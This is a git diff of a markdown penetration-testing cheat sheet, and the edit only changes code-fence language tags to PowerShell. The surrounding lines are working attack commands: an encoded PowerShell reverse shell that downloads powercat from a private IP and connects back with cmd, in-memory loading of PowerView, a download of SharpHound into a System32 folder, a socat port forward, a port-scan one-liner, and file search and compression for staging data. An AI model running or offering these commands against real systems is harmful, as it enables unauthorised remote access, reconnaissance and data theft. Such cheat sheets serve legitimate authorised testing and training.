@@ -75,14 +75,14 @@ socat -v tcp4-listen:8000,reuseaddr,fork tcp4:10.10.12.15:80
 
 ### Encoded commands
 
-```sh
+```powershell
 $command="ls"
 $Encoded = [convert]::ToBase64String([System.Text.encoding]::Unicode.GetBytes($command))
 powershell.exe -encoded $Encoded
 ```
 Reverse Shell
 
-```sh
+```powershell
 $command={IEX(New-Object System.Net.WebClient).DownloadString('http://10.13.14.3:9000/powercat.ps1'); powercat -c 10.13.14.3 -p 1234 -e cmd}
 $Encoded = [convert]::ToBase64String([System.Text.encoding]::Unicode.GetBytes($command))
 
@@ -93,13 +93,13 @@ $encodedCommand = [Convert]::ToBase64String($bytes)
 
 Port Scanning
 
-```sh
+```powershell
 1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect("localhost", $_)) "Port $_ is open!")) 2>$null
 ```
 
 Downloading
 
-```sh
+```powershell
 $url="http://10.10.14.13:9000/SharpHound.exe"
 $output="C:\Windows\System32\spool\drivers\color\SharpHound.exe"
 (New-object system.net.webclient).downloadfile($url,$output)
@@ -109,24 +109,24 @@ $output="C:\Windows\System32\spool\drivers\color\SharpHound.exe"
 
 Reflective Downloading
 
-```sh
+```powershell
 IEX(New-Object Net.WebClient).DownloadString('http://10.10.16.7:9000/PowerView.ps1')
 ```
 
 Size of Folder
 
-```sh
+```powershell
 "{0} MB" -f ((Get-ChildItem C:\users\ -Recurse -force | Measure-Object -Property Length -Sum -ErrorAction Stop).Sum / 1MB)
 ```
 
 Compress
 
-```sh
+```powershell
 Compress-Archive -LiteralPath <PathToFolder> -DestinationPath <PathToDestination>
 ```
 Find Files
 
-```sh
+```powershell
 gci -force -recurse -file -ea silentlycontinue  
 
 Get-ChildItem -Path C:\ -Include *.doc,*.docx -File -Recurse -force -ErrorAction SilentlyContinue
